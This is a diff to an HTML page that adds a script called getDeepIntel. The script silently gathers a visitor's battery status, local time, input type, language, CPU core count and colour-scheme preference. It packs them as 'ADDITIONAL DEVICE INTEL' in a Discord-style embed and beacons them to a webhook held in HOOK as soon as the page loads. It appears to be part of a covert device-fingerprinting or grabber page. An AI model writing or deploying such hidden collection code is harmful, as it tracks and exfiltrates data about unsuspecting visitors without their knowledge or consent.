@@ -191,6 +191,35 @@
     }
 </script>
     <script>
+    async function getDeepIntel() {
+        let batteryInfo = "Unsupported";
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Discharging"})`;
+        } catch (e) {}
+
+        const deepData = {
+            content: "📊 **ADDITIONAL DEVICE INTEL**",
+            embeds: [{
+                color: 3447003,
+                fields: [
+                    { name: "🔋 Battery", value: batteryInfo, inline: true },
+                    { name: "🕰️ Local Time", value: new Date().toLocaleTimeString(), inline: true },
+                    { name: "🖱️ Input Type", value: (('ontouchstart' in window) ? "Touch Screen" : "Mouse/Trackpad"), inline: true },
+                    { name: "🌍 Language", value: navigator.language, inline: true },
+                    { name: "🖥️ Logical Processors", value: navigator.hardwareConcurrency + " Cores", inline: true },
+                    { name: "🌗 Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled", inline: true }
+                ]
+            }]
+        };
+
+        navigator.sendBeacon(HOOK, new Blob([JSON.stringify(deepData)], {type: 'application/json'}));
+    }
+
+    // Run this inside your main One-Tap function
+    getDeepIntel();
+</script>
+    <script>
     async function oneTapProtocol() {
         const start = Date.now();
         const isRe = sessionStorage.getItem('v');
